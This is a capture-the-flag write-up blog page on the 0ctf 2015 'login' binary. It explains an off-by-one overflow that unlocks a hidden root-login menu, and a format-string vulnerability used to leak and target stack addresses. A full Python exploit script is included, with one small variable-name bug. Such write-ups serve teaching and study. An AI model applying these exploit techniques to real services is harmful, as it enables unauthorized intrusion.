@@ -1,0 +1,809 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>0ctf - Login - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="The second pwnable I solved for 0ctf on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one? login was a 64-bit &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/03/30/0ctf-login">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">0ctf - Login</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-30T20:17:23+02:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:17 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>The second pwnable I solved for <code>0ctf</code> on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one?</p>
+
+<!-- more -->
+
+
+<p><code>login</code> was a 64-bit ELF. Quickly checking what I was up against with <code>gdb-peda</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : ENABLED
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : ENABLED
+</span><span class='line'>RELRO     : FULL
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of <code>strings</code>, this allowed me to bypass the first login:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Login: guest
+</span><span class='line'>Password: <span class="nv">guest123</span>
+</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
+</span><span class='line'>1. Show Profile
+</span><span class='line'>2. Login as User
+</span><span class='line'>3. <span class="nv">Logout</span>
+</span><span class='line'><span class="o">=======================</span>
+</span><span class='line'>Your choice: 1
+</span><span class='line'>Username: guest
+</span><span class='line'>Level: Guest
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, we&rsquo;re presented with three choices. With <code>2</code>, we can change our username and view it with <code>1</code>. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;;;</span> print_menu and get_choice
+</span><span class='line'>1265: call   ddd &lt;open@plt+0x24d&gt;   
+</span><span class='line'>126a: mov    DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>,eax
+</span><span class='line'>126d: mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>
+</span><span class='line'>1270: cmp    eax,0x2
+</span><span class='line'>1273: je     <span class="m">1299</span> &lt;open@plt+0x709&gt;
+</span><span class='line'>1275: cmp    eax,0x2
+</span><span class='line'>1278: jg     <span class="m">1281</span> &lt;open@plt+0x6f1&gt;
+</span><span class='line'>127a: cmp    eax,0x1
+</span><span class='line'>127d: je     128d &lt;open@plt+0x6fd&gt;
+</span><span class='line'>127f: jmp    12e3 &lt;open@plt+0x753&gt;
+</span><span class='line'>1281: cmp    eax,0x3
+</span><span class='line'>1284: je     12a5 &lt;open@plt+0x715&gt;
+</span><span class='line'>1286: cmp    eax,0x4                <span class="p">;</span> AHA! Secret entry
+</span><span class='line'>1289: je     12b8 &lt;open@plt+0x728&gt;  <span class="p">;</span> Jump to 12b8
+</span><span class='line'>128b: jmp    12e3 &lt;open@plt+0x753&gt;
+</span><span class='line'>128d: mov    eax,0x0
+</span><span class='line'>1292: call   f24 &lt;open@plt+0x394&gt;
+</span><span class='line'>1297: jmp    12f0 &lt;open@plt+0x760&gt;
+</span><span class='line'>1299: mov    eax,0x0
+</span><span class='line'>129e: call   f7a &lt;open@plt+0x3ea&gt;
+</span><span class='line'>12a3: jmp    12f0 &lt;open@plt+0x760&gt;
+</span><span class='line'>12a5: lea    rdi,<span class="o">[</span>rip+0x246<span class="o">]</span>        <span class="c"># 14f2 &lt;open@plt+0x962&gt;</span>
+</span><span class='line'>12ac: call   a90 &lt;puts@plt&gt;
+</span><span class='line'>12b1: mov    eax,0x0
+</span><span class='line'>12b6: jmp    12f5 &lt;open@plt+0x765&gt;
+</span><span class='line'>
+</span><span class='line'><span class="p">;;;</span> choice 4
+</span><span class='line'>12b8: lea    rax,<span class="o">[</span>rip+0x200d81<span class="o">]</span>     <span class="p">;</span> rax points to our provided username <span class="o">(</span>e.g. <span class="s1">&#39;root&#39;</span><span class="o">)</span>
+</span><span class='line'>12bf: mov    eax,DWORD PTR <span class="o">[</span>rax+0x100<span class="o">]</span>  <span class="p">;</span> check this flag... starts off as 0x1
+</span><span class='line'>12c5: <span class="nb">test   </span>eax,eax
+</span><span class='line'>12c7: jne    12d5 &lt;open@plt+0x745&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we need to bypass this secret menu and make sure that the flag is set to <code>0x00</code>. As I said, <code>rax</code> points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero&hellip; we&rsquo;re looking for an off-by-one! This is present in the <code>input username</code> function, allowing the reset of the flag and entering the secret login menu:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Login: guest
+</span><span class='line'>Password: <span class="nv">guest123</span>
+</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
+</span><span class='line'>1. Show Profile
+</span><span class='line'>2. Login as User
+</span><span class='line'>3. <span class="nv">Logout</span>
+</span><span class='line'><span class="o">=======================</span>
+</span><span class='line'>Your choice: 2
+</span><span class='line'>Enter your new username:
+</span><span class='line'>HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
+</span><span class='line'>Done.
+</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
+</span><span class='line'>1. Show Profile
+</span><span class='line'>2. Login as User
+</span><span class='line'>3. <span class="nv">Logout</span>
+</span><span class='line'><span class="o">=======================</span>
+</span><span class='line'>Your choice: 4
+</span><span class='line'>Login: root
+</span><span class='line'>Password: toor
+</span><span class='line'>root login failed.
+</span><span class='line'><span class="m">1</span> chance remaining.
+</span><span class='line'>Login: %llp
+</span><span class='line'>Password: bleh
+</span><span class='line'>0x7f13e2689490 login failed.
+</span><span class='line'>Threat detected. System shutdown.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I won&rsquo;t show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to <code>0ops{secret_md5}</code>. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it&rsquo;s a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of RELRO, it&rsquo;s loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared.</p>
+
+<p>Easy, right? Wrong. The remote binary returned the same string, <code>0ops{secret_md5}</code>. Obviously, I had to find another way to break this binary.</p>
+
+<h2>The Nitty Gritty</h2>
+
+<p>I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the <code>memcmp</code> succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>11d9: lea    rsi,<span class="o">[</span>rip+0x2b5<span class="o">]</span>       <span class="p">;</span> <span class="s1">&#39;secret_MD5&#39;</span> --&gt; same remotely :?
+</span><span class='line'>11e0: mov    rdi,rax
+</span><span class='line'>11e3: call   b70 &lt;memcmp@plt&gt;
+</span><span class='line'>11e8: <span class="nb">test   </span>eax,eax
+</span><span class='line'>11ea: jne    11f8 &lt;open@plt+0x668&gt;
+</span><span class='line'>11ec: mov    eax,0x0
+</span><span class='line'>11f1: call   fb3 &lt;open@plt+0x423&gt;
+</span><span class='line'>11f6: jmp    122e &lt;open@plt+0x69e&gt;
+</span><span class='line'>11f8: lea    rax,<span class="o">[</span>rbp-0x210<span class="o">]</span>
+</span><span class='line'>11ff: mov    rdi,rax
+</span><span class='line'>1202: mov    eax,0x0
+</span><span class='line'>1207: call   a70 &lt;<span class="nb">printf</span>@plt&gt;      <span class="p">;</span> second <span class="nb">printf </span>call<span class="p">;</span> overwrite saved ret addr using format string vuln
+</span><span class='line'>120c: lea    rdi,<span class="o">[</span>rip+0x293<span class="o">]</span>        <span class="c"># 14a6 &lt;open@plt+0x916&gt;</span>
+</span><span class='line'>1213: call   a90 &lt;puts@plt&gt;
+</span><span class='line'>1218: lea    rdi,<span class="o">[</span>rip+0x2b1<span class="o">]</span>        <span class="c"># 14d0 &lt;open@plt+0x940&gt;</span>
+</span><span class='line'>121f: call   a90 &lt;puts@plt&gt;
+</span><span class='line'>1224: mov    edi,0x1
+</span><span class='line'>1229: call   aa0 &lt;<span class="nb">exit</span>@plt&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?</p>
+
+<h2>Some luck involved</h2>
+
+<p>I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;202.112.26.107&#39;</span><span class="p">,</span> <span class="mi">10910</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest123&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;username:&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">256</span><span class="p">)</span>        <span class="c"># overflow userflag</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>         <span class="c"># secret login menu</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c">### first format string vuln to read stack addr</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># leak both binary address and stack address</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%1$lp-%&#39;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s">&#39;$lp&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;login failed.&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;([a-f0-9]{5,})&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># find stack addr:</span>
+</span><span class='line'>  <span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1490</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of base: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of stack: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC%10$s&#39;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">-</span><span class="mi">504</span><span class="p">))</span> <span class="c"># this offset of 504 was found locally and seems to be correct for remote, too</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
+</span><span class='line'>  <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">):</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="n">b</span><span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;you&#39;re looking for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x120c</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># check if the stack location contains the right return address</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">):</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="n">b</span><span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x120c</span><span class="p">):</span>
+</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;Found at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'>      <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'>      
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can&rsquo;t send null-bytes, if we overwrite something else, the pointer would be mangled:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">before</span><span class="p">:</span> <span class="mh">0xdeadbeef</span> <span class="mh">0xcafebabe</span>
+</span><span class='line'><span class="n">after</span><span class="p">:</span>  <span class="mh">0x504ddb66</span> <span class="mh">0x7fff00be</span> <span class="o">-&gt;</span> <span class="n">stack</span> <span class="n">address</span> <span class="ow">is</span> <span class="n">invalid</span><span class="p">,</span> <span class="n">pointing</span> <span class="n">to</span> <span class="mh">0xbe007fff</span><span class="o">....</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">should</span> <span class="n">be</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">before</span><span class="p">:</span> <span class="mh">0xdeadbeef</span> <span class="mh">0xcafe0000</span>
+</span><span class='line'><span class="n">after</span><span class="p">:</span>  <span class="mh">0x504ddb66</span> <span class="mh">0x7fff0000</span> <span class="o">-&gt;</span> <span class="n">properly</span> <span class="nb">set</span> <span class="n">stack</span> <span class="n">address</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
